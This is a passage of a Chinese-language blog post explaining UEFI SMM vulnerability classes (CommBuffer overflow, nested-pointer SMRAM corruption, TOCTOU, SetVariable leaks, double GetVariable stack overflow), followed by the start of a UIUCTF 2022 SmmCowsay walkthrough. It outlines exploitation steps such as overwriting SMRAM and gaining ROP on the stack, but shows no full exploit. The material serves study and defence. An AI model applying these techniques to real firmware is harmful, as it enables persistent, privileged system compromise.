<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">BOOLEAN</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmIsBufferOutsideSmmValid</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_PHYSICAL_ADDRESS  Buffer,</span></span><br><span class="line"><span class="params">  IN UINT64                Length</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> (B:0-&gt;L:4G) is invalid for IA32, but (B:1-&gt;L:4G-1)/(B:4G-1-&gt;L:1) is valid.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> ((Length &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      (Buffer &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      ((Length != <span class="number">0</span>) &amp;&amp; (Buffer &gt; (mSmmMemLibInternalMaximumSupportAddress - (Length - <span class="number">1</span>)))))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Overflow happen</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DEBUG ((</span><br><span class="line">      DEBUG_ERROR,</span><br><span class="line">      <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overflow: Buffer (0x%lx) - Length (0x%lx), MaximumSupportAddress (0x%lx)\n&quot;</span>,</span><br><span class="line">      Buffer,</span><br><span class="line">      Length,</span><br><span class="line">      mSmmMemLibInternalMaximumSupportAddress</span><br><span class="line">      ));</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibInternalSmramCount; Index++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibInternalSmramRanges[Index].CpuStart) &amp;&amp; (Buffer &lt; mSmmMemLibInternalSmramRanges[Index].CpuStart + mSmmMemLibInternalSmramRanges[Index].PhysicalSize)) ||</span><br><span class="line">        ((mSmmMemLibInternalSmramRanges[Index].CpuStart &gt;= Buffer) &amp;&amp; (mSmmMemLibInternalSmramRanges[Index].CpuStart &lt; Buffer + Length)))</span><br><span class="line">    &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overlap: Buffer (0x%lx) - Length (0x%lx), &quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;CpuStart (0x%lx) - PhysicalSize (0x%lx)\n&quot;</span>,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].CpuStart,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].PhysicalSize</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override for Valid Communication Region</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (mSmmMemLibSmmReadyToLock) &#123;</span><br><span class="line">    EFI_MEMORY_DESCRIPTOR  *MemoryMap;</span><br><span class="line">    BOOLEAN                InValidCommunicationRegion;</span><br><span class="line"></span><br><span class="line">    InValidCommunicationRegion = FALSE;</span><br><span class="line">    MemoryMap                  = mMemoryMap;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mMemoryMapEntryCount; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((Buffer &gt;= MemoryMap-&gt;PhysicalStart) &amp;&amp;</span><br><span class="line">          (Buffer + Length &lt;= MemoryMap-&gt;PhysicalStart + LShiftU64 (MemoryMap-&gt;NumberOfPages, EFI_PAGE_SHIFT)))</span><br><span class="line">      &#123;</span><br><span class="line">        InValidCommunicationRegion = TRUE;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      MemoryMap = NEXT_MEMORY_DESCRIPTOR (MemoryMap, mDescriptorSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!InValidCommunicationRegion) &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Not in ValidCommunicationRegion: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check untested memory as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibGcdMemNumberOfDesc; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibGcdMemSpace[Index].BaseAddress) &amp;&amp; (Buffer &lt; mSmmMemLibGcdMemSpace[Index].BaseAddress + mSmmMemLibGcdMemSpace[Index].Length)) ||</span><br><span class="line">          ((mSmmMemLibGcdMemSpace[Index].BaseAddress &gt;= Buffer) &amp;&amp; (mSmmMemLibGcdMemSpace[Index].BaseAddress &lt; Buffer + Length)))</span><br><span class="line">      &#123;</span><br><span class="line">        DEBUG ((</span><br><span class="line">          DEBUG_ERROR,</span><br><span class="line">          <span class="string">&quot;SmmIsBufferOutsideSmmValid: In Untested Memory Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">          Buffer,</span><br><span class="line">          Length</span><br><span class="line">          ));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check UEFI runtime memory with EFI_MEMORY_RO as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (mSmmMemLibMemoryAttributesTable != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      EFI_MEMORY_DESCRIPTOR  *Entry;</span><br><span class="line"></span><br><span class="line">      Entry = (EFI_MEMORY_DESCRIPTOR *)(mSmmMemLibMemoryAttributesTable + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibMemoryAttributesTable-&gt;NumberOfEntries; Index++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((Entry-&gt;Type == EfiRuntimeServicesCode) || (Entry-&gt;Type == EfiRuntimeServicesData)) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((Entry-&gt;Attribute &amp; EFI_MEMORY_RO) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((Buffer &gt;= Entry-&gt;PhysicalStart) &amp;&amp; (Buffer &lt; Entry-&gt;PhysicalStart + LShiftU64 (Entry-&gt;NumberOfPages, EFI_PAGE_SHIFT))) ||</span><br><span class="line">                ((Entry-&gt;PhysicalStart &gt;= Buffer) &amp;&amp; (Entry-&gt;PhysicalStart &lt; Buffer + Length)))</span><br><span class="line">            &#123;</span><br><span class="line">              DEBUG ((</span><br><span class="line">                DEBUG_ERROR,</span><br><span class="line">                <span class="string">&quot;SmmIsBufferOutsideSmmValid: In RuntimeCode Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">                Buffer,</span><br><span class="line">                Length</span><br><span class="line">                ));</span><br><span class="line">              <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Entry = NEXT_MEMORY_DESCRIPTOR (Entry, mSmmMemLibMemoryAttributesTable-&gt;DescriptorSize);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当时这个函数的设置也存在缺陷，那就是 SmmIsBufferOutsideSmmValid 只会检查 CommBuffer 是否和 SMRAM 重叠，不会检查写入 CommBuffer 的内容是否溢出 CommBuffer。举个例子就是假设 CommBuffer 定义时长度 10 byte，但是输入的 20 byte。SmmIsBufferOutsideSmmValid 函数会检查 CommBuffer 到 CommBuffer + 10 byte 的区域和 SMRAM 有无重叠，但是不会检查 CommBuffer 到 CommBuffer + 20 byte 的区域。所以 SMI 处理处理不当的话依然会造成低地址的 SMRAM 损坏。  </p>
<p>下面是一个具体的例子：  </p>
<img src="/2024/12/14/uefi/4.png" class="" title="我的图图呢">  

<p>这段代码主要干了如下几件事情：<br>1、检测 CommBuffer 和 CommBufferSize 的完整性。<br>2、读取由 0x115 指定的特定于模型的寄存器的值并赋值给 v4。<br>3、将 v4 的值经过一系列运算得出一个 QWORD 类型的数据并赋值给 CommBuffer。  </p>
<p>我们不难想到，如果我们的 CommBuffer 的大小为 1，最后的赋值操作就会出现 7 字节的溢出。这里我们可以将 CommBuffer 申请的直接与 SMRAM 相邻，大小为一字节，最后赋值的时候就会出现溢出修改 SMRAM 的前 7 字节。  </p>
<img src="/2024/12/14/uefi/5.png" class="" title="我的图图呢">  

<p>这类漏洞的修复方法也很简单，直接比较 CommBuffer 的大小与赋值的数据的大小即可。  </p>
<h4 id="Arbitrary-SMRAM-Corruption"><a href="#Arbitrary-SMRAM-Corruption" class="headerlink" title="Arbitrary SMRAM Corruption"></a>Arbitrary SMRAM Corruption</h4><p>如果没使用 SmmIsBufferOutsideSmmValid 函数对多级指针指向的地址空间做检查，且 SMI 处理程序中多级指针指向 SMRAM 内的地址空间，就可以造成任意 SMRAM 损坏。一个简单的例子如下：  </p>
<img src="/2024/12/14/uefi/6.png" class="" title="我的图图呢">  


<p>此处通过判断 CommBuffer 的地址处的字节来进行 switch，如果当前字节不为 0、2、3 则执行 default 里的代码。default 的代码中将一个错误代码写入了 CommBuffer + 1 地址为首地址的指针所指向的值。可以看到这个赋值的地址并没有进行检测，如果我们可以控制 *(CommBuffer + 1) 为 SMRAM 的地址，我们就能够在 SMRAM 中写入这个错误代码，对其进行破坏。  </p>
<img src="/2024/12/14/uefi/7.png" class="" title="我的图图呢">  

<p>修复方法：每次在使用多级指针进行赋值时使用 SmmIsBufferOutsideSmmValid 对多级指针指向的地址空间做检查即可。  </p>
<h4 id="TOCTOU-attacks"><a href="#TOCTOU-attacks" class="headerlink" title="TOCTOU attacks"></a>TOCTOU attacks</h4><p>TOCTOU 是 time-of-check-time-of-use 的缩写。<br>SMM 设计的时候没有考虑到并发性，没有锁，也把其他中断屏蔽了，自然而然的也存在条件竞争漏洞。<br>这玩意其实也非常好理解，以下面这段代码为例：  </p>
<img src="/2024/12/14/uefi/8.png" class="" title="我的图图呢">  

<p>从中可以看出，该处理程序引用了一个嵌套指针，我们 field_18 在至少 3 个不同的位置对其进行了命名：<br>首先，从通信缓冲区中检索其值并将其保存到 SMRAM 中的局部变量中。<br>然后，SmmIsBufferOutsideSmmValid() 调用局部变量以确保它不与 SMRAM 重叠。<br>如果被认为是安全的，则从通信缓冲区重新读取嵌套指针，然后将其作为 CopyMem() 目标参数传递。<br>如前所述，没有任何保证可以保证从通信缓冲区连续读取必然会产生相同的值。这意味着攻击者可以使用指向 SMRAM 之外完全安全位置的指针发出此 SMI。<br>然而，在 SMI 验证嵌套指针之后，在再次获取之前，存在一个小小的机会窗口，这时候可以利用条件竞争使用 DMA 攻击将对应的 smm_field_18 的内存进行修改。被修改的指针很快就会被传递给 CopyMem()，攻击者可以让它指向他想要破坏的 SMRAM 中的地址。  </p>
<h4 id="SetVariable-Information-Disclosure"><a href="#SetVariable-Information-Disclosure" class="headerlink" title="SetVariable() Information Disclosure"></a>SetVariable() Information Disclosure</h4><p>众所周知，SMRAM 无法从 SMM 外部读取，这就是为什么固件有时会使用它来存储必须对外界隐藏的秘密。除此之外，泄露 SMRAM 的内容还可以帮助利用需要准确了解内存布局的其他漏洞。<br>当 SMM 代码尝试更新 NVRAM 变量的内容时，可能会发生 SMRAM 泄露。在 UEFI 中，更新 NVRAM 变量不是原子操作，而是由以下步骤组成的复合操作：  </p>
<ul>
<li>分配一个堆栈缓冲区来保存与变量相关的数据。  </li>
<li>使用 GetVariable() 函数将变量的内容读入堆栈缓冲区。  </li>
<li>对堆栈缓冲区执行所有必要的修改。  </li>
<li>使用 SetVariable() 函数将修改后的堆栈缓冲区写回 NVRAM。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Status = gRT-&gt;GetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,                <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid,  <span class="comment">// VendorGuid</span></span><br><span class="line">                &amp;Attributes,                            <span class="comment">// Attributes</span></span><br><span class="line">                &amp;DataSize,                              <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                   <span class="comment">// Data</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">Status = gRT-&gt;SetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,               <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid, <span class="comment">// VendorGuid</span></span><br><span class="line">                EFI_VARIABLE_NON_VOLATILE |</span><br><span class="line">                EFI_VARIABLE_BOOTSERVICE_ACCESS |</span><br><span class="line">                EFI_VARIABLE_RUNTIME_ACCESS,</span><br><span class="line">                                                       <span class="comment">// Attributes </span></span><br><span class="line">                <span class="keyword">sizeof</span> (EXAMPLE_CONFIGURATION),        <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                  <span class="comment">// Data</span></span><br><span class="line">                );                </span><br></pre></td></tr></table></figure>

<p>这两个函数的第四个参数是读取和写入的 nvram 变量的长度，如果 SetVariable 的第四个参数大于修改后的局部变量的长度，会将多余的数据写入nvram 变量造成信息泄露。  </p>
<p>当开发人员隐式假设变量的大小是不可变的时，就会出现问题。由于这个假设，他们完全忽略了 GetVariable() 读取的字节数，并在 SetVariable() 写入更新内容时传递硬编码的大小。  </p>
<p>攻击流程如下：<br>首先调用操作系统提供的API函数来截断变量(如SetFirmwareEnvironmentVariable)，然后触发SMI处理程序，处理程序将：<br>1、分配基于堆栈的缓冲区，默认未初始化，这意味着它保存了 SMM 中发生的之前函数调用的剩余内容，包括各种地址什么的内容。  </p>
<img src="/2024/12/14/uefi/9.png" class="" title="我的图图呢">  

<p>2、调用 GetVariable 函数将变量的内容读入缓冲区。因为攻击者截断了 NVRAM 的变量，所以缓冲区肯定比变量的长度长。意味着它在 GetVariable 返回的时候仍然会带有一些未初始化的字节。  </p>
<img src="/2024/12/14/uefi/10.png" class="" title="我的图图呢">  

<p>3、修改内存中的堆栈缓冲区。</p>
<img src="/2024/12/14/uefi/11.png" class="" title="我的图图呢">  

<p>4、调用 SetVariable() 函数将修改后的堆栈缓冲区写回到 NVRAM。由于此调用是使用硬编码的恒定堆栈缓冲区大小完成的，因此它还会将其未初始化的部分写入 NVRAM。</p>
<img src="/2024/12/14/uefi/12.png" class="" title="我的图图呢">  

<p>攻击者可以利用类似于 GetFirmwareEnvironmentVariable() 这一类函数来获取未初始化的内容进而泄露出有用的数据。</p>
<h4 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable()"></a>Double GetVariable()</h4><p>下面的漏洞代码位于偏移量 0x7B68（固件名称：S05_02020000.bin，应用程序名称0138）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckBatterySafety</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_GUID VendorGuid;</span><br><span class="line">  <span class="type">char</span> Buffer;</span><br><span class="line">  UINTN DataSize;</span><br><span class="line"></span><br><span class="line">  VendorGuid.Data1 = <span class="number">0xFB3B9ECE</span>;</span><br><span class="line">  *&amp;VendorGuid.Data2 = <span class="number">0x49334ABA</span>;</span><br><span class="line">  *VendorGuid.Data4 = <span class="number">0xD6B49DB4</span>;</span><br><span class="line">  *&amp;VendorGuid.Data4[<span class="number">4</span>] = <span class="number">0x5123897D</span>;</span><br><span class="line">  Buffer = <span class="number">0</span>;</span><br><span class="line">  DataSize = <span class="number">1</span>i64;</span><br><span class="line">  <span class="keyword">return</span> (!gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyModeStatus&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer)</span><br><span class="line">       || !gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyMode&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer))</span><br><span class="line">      &amp;&amp; Buffer == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 NVRAM 变量 BatterySafetyModeStatus 的长度大于 1，则将 DataSize 设置为 BatterySafetyModeStatus 变量的长度，并第二次调用 GetVariable 服务。<br>第二次调用 GetVariable 服务后，NVRAM 变量 BatterySafetyMode 的值将写入 Buffer 堆栈变量。<br>通过控制 BatterySafetyModeStatus 和 BatterySafetyMode 变量的值，我们可以将任何数据写入堆栈，从而在堆栈上执行任意代码。<br>利用步骤：<br>1、更改 BatterySafetyModeStatus 和 BatterySafetyMode 变量。<br>2、通过更改 BatterySafetyModeStatus 变量的值，我们在第二次调用 GetVariable 之前更改 DataSize 的值。<br>3、通过更改 BatterySafetyMode 变量的值，我们可以溢出堆栈并在堆栈上执行任意代码（ROP）。  </p>
<h2 id="通过一些题目进行练习"><a href="#通过一些题目进行练习" class="headerlink" title="通过一些题目进行练习"></a>通过一些题目进行练习</h2><p>其实我是想直接分析并利用 CVE，毕竟这更加接近 RealWorld。可无奈于 CTF 题目太适合入门了🥹  </p>
<h3 id="UIUCTF-2022-SmmCowsay1"><a href="#UIUCTF-2022-SmmCowsay1" class="headerlink" title="UIUCTF 2022 SmmCowsay1"></a>UIUCTF 2022 SmmCowsay1</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p>
<blockquote>
<p>One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at physical address 0x44440000, and since it could only be read from SMM, that can only mean one thing: it… was a horrible idea.  </p>
</blockquote>
<p>题目附件文件结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cow/</span><br><span class="line">├── README</span><br><span class="line">├── chal_build</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   ├── handout-readme</span><br><span class="line">│   ├── handout_run.sh</span><br><span class="line">│   └── patches</span><br><span class="line">│       ├── edk2</span><br><span class="line">│       │   ├── 0001-PiSmmCore-Fix-for-CVE-2021-38578-integer-underflow.patch</span><br><span class="line">│       │   ├── 0002-ShellPkg-Simplify-Shell.patch</span><br><span class="line">│       │   ├── 0003-SmmCowsay-Vulnerable-Cowsay.patch</span><br><span class="line">│       │   ├── 0004-Add-UEFI-Binexec.patch</span><br><span class="line">│       │   └── 0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</span><br><span class="line">│       └── qemu</span><br><span class="line">│           └── 0001-Implement-UIUCTFMMIO-device.patch</span><br><span class="line">├── edk2_artifacts</span><br><span class="line">│   ├── AcpiTableDxe.debug</span><br><span class="line">│   ├── AcpiTableDxe.efi</span><br><span class="line">│   ├── AmdSevDxe.debug</span><br><span class="line">│   ├── AmdSevDxe.efi</span><br><span class="line">│   ├── ArpDxe.debug</span><br><span class="line">|   ..................</span><br><span class="line">│   ├── httpDynamicCommand.efi</span><br><span class="line">│   ├── tftpDynamicCommand.debug</span><br><span class="line">│   └── tftpDynamicCommand.efi</span><br><span class="line">├── edk2debug.log</span><br><span class="line">└── run</span><br><span class="line">    ├── OVMF_CODE.fd</span><br><span class="line">    ├── OVMF_VARS.fd</span><br><span class="line">    ├── OVMF_VARS_copy.fd</span><br><span class="line">    ├── kvmvapic.bin</span><br><span class="line">    ├── qemu-system-x86_64</span><br><span class="line">    ├── region4</span><br><span class="line">    ├── rootfs</span><br><span class="line">    │   ├── binexec.efi</span><br><span class="line">    │   └── startup.nsh</span><br><span class="line">    └── run.sh</span><br></pre></td></tr></table></figure>

<p>运行 run 目录下的 run.sh 即可启动题目，题目运行效果如下：  </p>
<img src="/2024/12/14/uefi/14.png" class="" title="我的图图呢">  

<p>可以看到题目的意思就是执行我们输入的 amd64 shellcode，我们简单验证一下  </p>
<p>生成 shellcode  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:~$ pwn asm -c amd64 <span class="string">&quot;mov rax, 0xdeadbeafdeadbeaf&quot;</span></span><br><span class="line">48b8afbeaddeafbeadde</span><br></pre></td></tr></table></figure>

<p>运行结果如下：  </p>
<img src="/2024/12/14/uefi/15.png" class="" title="我的图图呢">  
<p>可以看到 rax 寄存器的值已经被改变  </p>
<p>而我们的 shellcode 是在 SMRAM 外面运行的，能够做的事情非常有限，所以我们需要利用漏洞来获取更高的执行权限或者读取需要高权限才能获取的内容。   </p>
<p>chal_build 目录里给出了多个 patch 文件，按理来说漏洞应该就会出现在这个地方。由于有 patch 文件，所以我们就不需要用 ida 对固件进行逆向，直接阅读源码即可。  </p>
<p>首先看 SmmCowsay-Vulnerable-Cowsay.patch 文件，从名字来看就感觉这个文件非常的重要。<br>首先看最下方的 inf 文件:  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">+++ b/OvmfPkg/SmmCowsay/SmmCowsay.inf</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,38 @@</span></span><br><span class="line"><span class="addition">+[Defines]</span></span><br><span class="line"><span class="addition">+  INF_VERSION                    = 0x00010005</span></span><br><span class="line"><span class="addition">+  BASE_NAME                      = SmmCowsay</span></span><br><span class="line"><span class="addition">+  FILE_GUID                      = A7DE70E0-918E-4DFE-BFFB-AD860A376E65</span></span><br><span class="line"><span class="addition">+  MODULE_TYPE                    = DXE_SMM_DRIVER</span></span><br><span class="line"><span class="addition">+  VERSION_STRING                 = 1.0</span></span><br><span class="line"><span class="addition">+  PI_SPECIFICATION_VERSION       = 0x0001000A</span></span><br><span class="line"><span class="addition">+  ENTRY_POINT                    = SmmCowsayInit</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+[Sources]</span></span><br><span class="line"><span class="addition">+  SmmCowsay.c</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure>

<p>用 gpt 的话来说，INF 文件是用于描述模块（例如驱动程序）的元数据，以及如何构建和安装模块的指令。</p>
<ul>
<li></li>
<li>INF_VERSION: INF 文件的版本号。0x00010005 是十六进制表示的版本号。</li>
<li>BASE_NAME: 模块的基名称，这里是 SmmCowsay。</li>
<li>FILE_GUID: 一个全局唯一标识符（GUID），用于唯一标识这个 INF 文件。A7DE70E0-918E-4DFE-BFFB-AD860A376E65 是这个 INF 文件的特定 GUID。</li>
<li>MODULE_TYPE: 指定模块的类型。DXE_SMM_DRIVER 表示这是一个 DXE 阶段的系统管理模块（SMM）驱动程序。</li>
<li>VERSION_STRING: 模块的版本字符串，这里是 1.0。</li>
<li>PI_SPECIFICATION_VERSION: 指定模块遵循的 UEFI 固件规格版本。0x0001000A 是十六进制表示的版本号。</li>
<li>ENTRY_POINT: 模块的入口点函数名，这里是 SmmCowsayInit，这意味着当模块被加载时，UEFI 固件将调用这个函数。</li>
</ul>
<p>注册处理程序的代码就在当前文件的 ENTRY_POINT 中：  </p>
